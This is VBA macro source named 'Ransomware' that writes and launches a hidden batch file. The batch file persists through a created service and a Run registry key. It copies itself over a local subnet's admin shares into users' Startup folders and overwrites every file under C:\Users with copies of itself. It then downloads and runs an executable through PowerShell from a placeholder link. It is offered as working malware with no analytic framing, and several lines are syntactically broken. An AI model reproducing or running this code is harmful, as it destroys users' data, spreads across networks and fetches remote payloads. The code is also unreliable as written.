Public Sub Ransomware()
     
    Const s = "c:\s.bat"
     
    Dim FileNumber As Integer
    Dim retVal As Variant
     
    FileNumber = FreeFile
     
     'creat batch file
    Open s For Output As #FileNumber
    Print #FileNumber, "@echo off"
    Print #FileNumber, "set gg=0"
    Print #FileNumber, "set servicename=DE"
    Print #FileNumber, "echo sc create %servicename% binpath=%0 >> service.bat"
    Print #FileNumber, "echo sc start %servicename% >> service.bat"
    Print #FileNumber, "attrib +h +r +s service.bat"
    Print #FileNumber, "start service.bat"
    Print #FileNumber, "reg add "; HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run; " /v "; Windows; Services; " /t "; REG_SZ; " /d %0"
    Print #FileNumber, "attrib +h +r +s %0"
    Print #FileNumber, ":abdhd"
    Print #FileNumber, "net use Z: \\192.168.1.%gg%\C$"
    Print #FileNumber, "if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.bat""
    Print #FileNumber, "mountvol Z: /d)"
    Print #FileNumber, "if %i% == 256 (goto infect) else (set /a i=i+1)"
    Print #FileNumber, "goto abdhd"
    Print #FileNumber, ":infect"
    Print #FileNumber, "for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)"
    Print #FileNumber, "for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)"
    Print #FileNumber, ":payload"
    Print #FileNumber, "powershell -Command "(New-Object Net.WebClient).DownloadFile('Direct Link Here', 'Download_Execute.exe')""
    Print #FileNumber, "powershell -Command "Invoke-WebRequest <Direct Link Here> -OutFile Downoad_Execute.exe""
    Print #FileNumber, "start %USERPROFILE%\Downloads\Download_Execute.exe"
    Close #FileNumber
     
     'run batch file
    retVal = Shell(MY_FILENAME, vbNormalFocus)
     
     ' NOTE THE BATCH FILE WILL RUN, BUT THE CODE WILL CONTINUE TO RUN.
    If retVal = 0 Then
        MsgBox "An Error Occured"
        Close #FileNumber
        End
    End If
     
     'Delete batch file
    Kill MY_FILENAME
     
End Sub
